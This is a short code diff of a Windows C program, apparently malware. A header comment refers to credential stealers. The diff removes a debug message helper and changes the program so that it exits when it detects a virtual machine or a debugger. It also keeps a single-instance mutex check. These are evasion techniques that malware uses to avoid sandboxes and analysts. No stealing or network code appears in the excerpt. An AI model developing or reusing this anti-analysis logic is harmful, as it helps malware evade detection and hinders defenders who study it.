@@ -18,44 +18,28 @@
 		- credential stealers
 */
 
-#include <stdio.h>
-#include <stdarg.h>
 #include <Windows.h>
+#include <intrin.h>
 
 #include "main.h"
 #include "anti.h"
-
-extern VOID Debug(LPCSTR fmt, ...) {
-#ifdef DEBUG
-	CHAR szMsg[BUFSIZ];
-	va_list args;
-
-	va_start(args, fmt);
-	vsprintf(szMsg, fmt, args);
-
-	MessageBox(NULL, szMsg, NAME, MB_OK);
-
-	va_end(args);
-#endif
-}
+#include "helper.h"
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 	CreateMutex(NULL, TRUE, NAME);
 	if (GetLastError() == ERROR_ALREADY_EXISTS)
 		ExitProcess(0);
 
-	WIN32_FIND_DATA wfd;
-	FindFirstFile("lol", &wfd);
-
 #ifdef ANTI_VIRTUALIZATION
-	CheckForVirtualization();
+	if (CheckForVirtualization() == TRUE)
+		ExitProcess(0);
 #endif
 
 #ifdef ANTI_DEBUGGING
 	if (CheckForDebuggers() == TRUE)
 		ExitProcess(0);
 #endif
-	
+
 	// get version info
 
 	Debug("Hello");
